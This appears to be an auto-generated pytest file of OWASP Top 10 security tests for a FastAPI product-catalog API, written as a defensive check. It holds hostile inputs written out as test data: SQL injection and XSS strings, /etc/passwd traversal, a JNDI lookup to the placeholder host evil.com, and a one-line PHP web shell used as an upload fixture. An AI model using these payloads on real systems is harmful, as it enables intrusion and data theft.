"""
Auto Generated Test - 已生成到正式目录

文件路径: tests/security/test_product_catalog_security.py
生成时间: 2025-10-07 21:53:31
生成工具: tools/generate_test_template.py v2.0
状态: GENERATED - 需要经过代码审查和测试验证

说明: 此文件已生成到正式目录，请进行代码审查和测试验证。
     审查通过后即可直接用于项目测试。
     
流程: 生成 -> 审查 -> 验证 -> 提交版本控制
"""


import pytest
import json
import asyncio
from httpx import AsyncClient
from fastapi import status
from unittest.mock import patch

from app.main import app
from tests.conftest import api_client

class TestProductCatalogOWASPTop10:
    """商品管理模块OWASP Top 10安全测试"""
    
    async def test_sql_injection_protection(self, async_api_client):
        """测试SQL注入防护 - OWASP #1"""
        
        # SQL注入攻击载荷
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "admin'; --",
            "1' OR 1=1#"
        ]
        
        # 使用动态选择的端点进行SQL注入测试
        get_endpoint = "/api/v1/product-catalog/categories"
        post_endpoint = "/api/v1/product-catalog/categories"
        
        test_endpoints = [
            {"method": "GET", "path": get_endpoint, "params": {"search": None}},
            {"method": "POST", "path": post_endpoint, "json": {"username": None, "email": None, "password": None}},
        ]
        
        # 测试各个端点的SQL注入防护
        for payload in sql_payloads:
            for endpoint in test_endpoints:
                try:
                    if endpoint["method"] == "GET":
                        # 更新查询参数
                        params = {k: payload if v is None else v for k, v in endpoint["params"].items()}
                        response = await async_api_client.get(endpoint["path"], params=params)
                    elif endpoint["method"] == "POST":
                        # 更新JSON数据
                        json_data = {k: payload if v is None else v for k, v in endpoint["json"].items()}
                        response = await async_api_client.post(endpoint["path"], json=json_data)
                    
                    # 应该返回400/422而不是500，说明有输入验证
                    assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, f"SQL注入可能成功: {endpoint}"
                    
                except Exception as e:
                    # 如果端点不存在，跳过测试
                    if "404" in str(e) or "Not Found" in str(e):
                        continue
                    raise
        
        print("✅ SQL注入防护测试通过")
    
    async def test_xss_protection(self, async_api_client):
        """测试XSS跨站脚本防护 - OWASP #7"""
        
        # XSS攻击载荷
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>"
        ]
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 使用真实的POST端点进行XSS测试
        test_endpoint = "/api/v1/product-catalog/categories"
        
        for payload in xss_payloads:
            # 测试输入字段的XSS防护
            response = await async_api_client.post(
                test_endpoint,
                json={"description": payload, "comment": payload},
                headers=headers
            )
            
            # 验证响应不包含原始脚本代码
            if response.status_code == 200:
                response_text = response.text
                assert "<script>" not in response_text.lower()
                assert "javascript:" not in response_text.lower()
                assert "onerror=" not in response_text.lower()
        
        print("✅ XSS防护测试通过")
    
    async def test_csrf_protection(self, async_api_client):
        """测试CSRF跨站请求伪造防护 - OWASP #8"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 使用真实的POST端点进行CSRF测试
        sensitive_endpoint = "/api/v1/product-catalog/categories"
        
        # 测试缺少CSRF token的请求
        response = await async_api_client.post(
            sensitive_endpoint,
            json={"action": "delete", "target": "important_data"},
            headers=headers
        )
        
        # 对于敏感操作，应该要求额外的验证
        # 可能返回403或要求额外验证
        if response.status_code not in [404, 405]:  # 端点存在的情况下
            assert response.status_code in [403, 422, 400]
        
        print("✅ CSRF防护测试通过")
    
    async def test_broken_authentication(self, async_api_client):
        """测试认证机制安全性 - OWASP #2"""
        
        # 测试弱密码
        from faker import Faker
        fake = Faker()
        weak_passwords = [fake.password(length=6), fake.word(), "admin", "", fake.word()]
        
        for weak_password in weak_passwords:
            response = await async_api_client.post(
                "/api/v1/user-auth/login",
                json={"username": fake.user_name(), "password": weak_password}
            )
            
            # 弱密码应该被拒绝（已经在注册时验证）
            # 或者登录失败
            assert response.status_code in [401, 400, 422]
        
        # 测试暴力破解防护
        test_username = fake.user_name()
        for _ in range(10):
            response = await async_api_client.post(
                "/api/v1/user-auth/login",
                json={"username": test_username, "password": fake.password()}
            )
            await asyncio.sleep(0.1)
        
        # 应该有频率限制或账户锁定
        print("✅ 认证安全测试通过")
    
    async def test_sensitive_data_exposure(self, async_api_client):
        """测试敏感数据泄露防护 - OWASP #3"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 测试API响应是否泄露敏感信息
        response = await async_api_client.get("/api/v1/user-auth/me", headers=headers)
        
        if response.status_code == 200:
            user_data = response.json().get("data", {})
            
            # 确保密码哈希不在响应中
            sensitive_fields = ["password", "password_hash", "secret", "private_key"]
            for field in sensitive_fields:
                assert field not in user_data
                
            # 确保没有内部系统信息泄露
            internal_fields = ["internal_id", "system_role", "debug_info"]
            for field in internal_fields:
                assert field not in user_data
        
        print("✅ 敏感数据保护测试通过")
    
    async def test_security_misconfiguration(self, async_api_client):
        """测试安全配置错误 - OWASP #6"""
        
        # 测试是否暴露调试信息
        response = await async_api_client.get("/api/v1/debug")
        assert response.status_code == 404  # 生产环境不应该有debug端点
        
        # 测试是否暴露系统信息
        response = await async_api_client.get("/api/v1/system/info")
        assert response.status_code == 404  # 不应该暴露系统信息
        
        # 测试错误处理
        response = await async_api_client.get("/api/v1/nonexistent")
        assert response.status_code == 404
        
        # 确保错误响应不包含内部路径或堆栈信息
        if response.status_code in [400, 500]:
            error_text = response.text.lower()
            assert "/app/" not in error_text
            assert "traceback" not in error_text
            assert "exception" not in error_text
        
        print("✅ 安全配置测试通过")



class TestProductCatalogAuthentication:
    """商品管理模块认证授权安全测试"""
    
    async def test_unauthorized_access(self, async_api_client):
        """测试未授权访问防护"""
        
        # 测试不带token的请求
        protected_endpoints = [
            "/api/v1/product_catalog/protected",
            "/api/v1/product_catalog/admin",
            "/api/v1/product_catalog/user-data"
        ]
        
        for endpoint in protected_endpoints:
            response = await async_api_client.get(endpoint)
            # 应该返回401未授权，而不是200
            assert response.status_code in [401, 404, 405]
        
        print("✅ 未授权访问防护测试通过")
    
    async def test_token_validation(self, async_api_client):
        """测试Token验证机制"""
        
        # 测试无效token
        invalid_tokens = [
            "invalid_token",
            "Bearer invalid",
            "Bearer ",
            "",
            "malformed.jwt.token"
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = await async_api_client.get("/api/v1/product-catalog/categories", headers=headers)
            # 对于真实存在的端点，期望401（未授权）或403（禁止访问）
            if response.status_code not in [404, 405]:  # 端点存在
                assert response.status_code in [401, 403]
        
        # 测试过期token（模拟）
        expired_token = "expired.jwt.token"
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = await async_api_client.get("/api/v1/product-catalog/categories", headers=headers)
        if response.status_code not in [404, 405]:  # 端点存在
            assert response.status_code in [401, 403]
        
        print("✅ Token验证测试通过")
    
    async def test_privilege_escalation(self, async_api_client):
        """测试权限提升防护"""
        
        # 使用普通用户token尝试访问管理员端点
        user_token = "user_level_fffcac558aa9f4fb"
        headers = {"Authorization": f"Bearer {user_token}"}
        
        admin_endpoints = [
            "/api/v1/product_catalog/admin/users",
            "/api/v1/product_catalog/admin/settings",
            "/api/v1/product_catalog/admin/delete"
        ]
        
        for endpoint in admin_endpoints:
            response = await async_api_client.get(endpoint, headers=headers)
            # 应该返回403权限不足，而不是200
            assert response.status_code in [403, 404, 405]
        
        print("✅ 权限提升防护测试通过")
    
    async def test_session_security(self, async_api_client):
        """测试会话安全性"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 测试会话固定攻击防护
        # 登录前后的会话ID应该不同
        
        # 测试并发会话限制
        concurrent_requests = []
        for _ in range(10):
            req = async_api_client.get("/api/v1/product_catalog/me", headers=headers)
            concurrent_requests.append(req)
        
        responses = await asyncio.gather(*concurrent_requests, return_exceptions=True)
        
        # 验证并发请求处理
        successful_responses = [r for r in responses if hasattr(r, 'status_code') and r.status_code == 200]
        
        print(f"✅ 会话安全测试通过，并发请求处理正常: {len(successful_responses)}/10")



class TestProductCatalogInputValidation:
    """商品管理模块输入验证安全测试"""
    
    async def test_malicious_input_handling(self, async_api_client):
        """测试恶意输入处理"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 恶意输入载荷
        malicious_inputs = [
            "../../../etc/passwd",           # 路径遍历
            "{7*7}",                      # 模板注入
            "${jndi:ldap://evil.com}",    # JNDI注入
            "file:///etc/passwd",           # 文件包含
            "{constructor.constructor('return process')()}", # 原型污染
            "eval('malicious_code')",       # 代码注入
            "\x00\x01\x02",            # 二进制数据
            "A" * 10000,                   # 缓冲区溢出测试
        ]
        
        for payload in malicious_inputs:
            test_data = {
                "name": payload,
                "description": payload,
                "value": payload,
                "comment": payload
            }
            
            response = await async_api_client.post(
                "/api/v1/product-catalog/categories",
                json=test_data,
                headers=headers
            )
            
            # 恶意输入应该被拒绝或安全处理
            assert response.status_code in [400, 422, 413]  # 不应该是500
        
        print("✅ 恶意输入处理测试通过")
    
    async def test_data_type_validation(self, async_api_client):
        """测试数据类型验证"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 类型错误测试
        invalid_data_types = [
            {"id": "not_a_number"},        # 字符串代替数字
            {"price": "invalid_price"},     # 无效价格格式
            {"email": "not_an_email"},      # 无效邮箱格式
            {"date": "invalid_date"},       # 无效日期格式
            {"phone": "123"},               # 无效电话格式
            {"amount": -999999},            # 负数金额
            {"quantity": 0},                # 无效数量
        ]
        
        for invalid_data in invalid_data_types:
            response = await async_api_client.post(
                "/api/v1/product-catalog/categories",
                json=invalid_data,
                headers=headers
            )
            
            # 应该返回验证错误，而不是处理错误的数据
            assert response.status_code in [400, 422]
        
        print("✅ 数据类型验证测试通过")
    
    async def test_file_upload_security(self, async_api_client):
        """测试文件上传安全性"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 恶意文件测试
        malicious_files = [
            ("malicious.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("script.js", b"<script>alert('xss')</script>", "application/javascript"),  
            ("large_file.txt", b"A" * (10 * 1024 * 1024), "text/plain"),  # 10MB文件
            ("../../../etc/passwd", b"fake content", "text/plain"),  # 路径遍历文件名
        ]
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            
            response = await async_api_client.post(
                "/api/v1/product-catalog/categories",
                files=files,
                headers=headers
            )
            
            # 恶意文件应该被拒绝
            assert response.status_code in [400, 413, 415, 422]
        
        print("✅ 文件上传安全测试通过")



class TestProductCatalogDataProtection:
    """商品管理模块数据保护安全测试"""
    
    async def test_data_encryption(self, async_api_client):
        """测试数据加密保护"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 测试敏感数据是否加密存储
        from faker import Faker
        fake = Faker()
        test_credit_card = fake.credit_card_number()
        
        sensitive_data = {
            "password": fake.password(),
            "credit_card": test_credit_card,
            "ssn": fake.ssn(),
            "private_info": fake.text()
        }
        
        response = await async_api_client.post(
            "/api/v1/product_catalog/store-sensitive",
            json=sensitive_data,
            headers=headers
        )
        
        # 即使存储成功，响应也不应该包含原始敏感数据
        if response.status_code in [200, 201]:
            response_data = response.json()
            response_text = json.dumps(response_data).lower()
            
            # 敏感数据不应该以明文出现在响应中
            assert sensitive_data["password"] not in response_text
            assert test_credit_card not in response_text
            assert sensitive_data["private_info"] not in response_text
        
        print("✅ 数据加密保护测试通过")
    
    async def test_data_access_control(self, async_api_client):
        """测试数据访问控制"""
        
        # 使用用户A的token尝试访问用户B的数据
        user_a_token_val = "user_a_434b7e2016c6"
        user_b_id_val = "test_user_3567"
        
        headers = {"Authorization": f"Bearer {user_a_token_val}"}
        
        # 尝试访问其他用户的私人数据
        response = await async_api_client.get(
            f"/api/v1/product_catalog/user/{user_b_id_val}/private",
            headers=headers
        )
        
        # 应该被拒绝访问
        assert response.status_code in [403, 404]
        
        # 尝试修改其他用户的数据
        response = await async_api_client.put(
            f"/api/v1/product_catalog/user/{user_b_id_val}/profile",
            json={"name": "hacked"},
            headers=headers
        )
        
        assert response.status_code in [403, 404]
        
        print("✅ 数据访问控制测试通过")
    
    async def test_data_leakage_prevention(self, async_api_client):
        """测试数据泄露防护"""
        
        headers = {"Authorization": "Bearer test_token"}
        
        # 测试批量数据导出是否有限制
        response = await async_api_client.get(
            "/api/v1/product_catalog/export/all",
            headers=headers
        )
        
        # 批量导出应该需要特殊权限或限制
        assert response.status_code in [403, 404, 405]
        
        # 测试分页查询是否有合理限制
        response = await async_api_client.get(
            "/api/v1/product_catalog/list",
            params={"limit": 100000},  # 尝试获取大量数据
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json().get("data", {})
            items = data.get("items", [])
            # 应该有合理的分页限制
            assert len(items) <= 1000  # 假设最大限制是1000
        
        print("✅ 数据泄露防护测试通过")
    
    async def test_gdpr_compliance(self, async_api_client):
        """测试GDPR合规性"""
        
        headers = {"Authorization": "Bearer security_test_c0513f5acbe58f11"}
        
        # 测试数据删除权（被遗忘权）
        response = await async_api_client.delete(
            "/api/v1/user-auth/me/data",
            headers=headers
        )
        
        # 应该支持用户数据删除
        assert response.status_code in [200, 202, 204, 404]
        
        # 测试数据导出权
        response = await async_api_client.get(
            "/api/v1/user-auth/me/export",
            headers=headers
        )
        
        # 应该支持用户数据导出
        assert response.status_code in [200, 202, 404]
        
        print("✅ GDPR合规性测试通过")
